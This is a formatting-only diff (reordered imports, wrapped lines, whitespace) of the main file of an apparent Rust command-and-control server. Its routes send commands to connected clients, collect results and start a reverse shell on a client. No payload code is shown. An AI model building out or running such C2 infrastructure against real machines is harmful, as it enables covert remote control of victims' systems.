@@ -1,24 +1,24 @@
-pub mod state;
+pub mod audit;
 pub mod auth;
 pub mod handlers;
 pub mod managers;
-pub mod audit;
+pub mod state;
 
-use axum::{
-    routing::{get, post},
-    serve, Router,
-};
-use common::config::ConfigManager;
 use crate::{
     auth::{auth_middleware, login_get, login_post},
     handlers::{api, web},
     state::AppState,
 };
+use axum::{
+    routing::{get, post},
+    serve, Router,
+};
+use common::config::ConfigManager;
 use std::time::Duration;
 use tokio::net::TcpListener;
+use tower_cookies::CookieManagerLayer;
 use tower_http::cors::CorsLayer;
 use tower_http::services::ServeDir;
-use tower_cookies::CookieManagerLayer;
 
 async fn cleanup_task(state: AppState) {
     let mut interval = tokio::time::interval(Duration::from_secs(60));
@@ -72,13 +72,18 @@ async fn main() -> Result<(), Box<dyn std::error::Error>> {
     let web_api_routes = Router::new()
         .route("/api/clients", get(api::api_clients))
         .route("/api/clients/{client_id}/commands", post(api::send_command))
-        .route("/api/clients/{client_id}/results", get(api::api_command_results))
-        .route("/api/clients/{client_id}/reverse_shell", post(api::initiate_reverse_shell))
+        .route(
+            "/api/clients/{client_id}/results",
+            get(api::api_command_results),
+        )
+        .route(
+            "/api/clients/{client_id}/reverse_shell",
+            post(api::initiate_reverse_shell),
+        )
         .route_layer(axum::middleware::from_fn_with_state(
             state.clone(),
             auth_middleware,
         ));
-
 
     // Main application router
     let app = Router::new()
@@ -95,7 +100,7 @@ async fn main() -> Result<(), Box<dyn std::error::Error>> {
     println!("C2 Server starting on http://{addr}");
 
     let listener = TcpListener::bind(&addr).await?;
-    
+
     serve(listener, app).await?;
 
     Ok(())
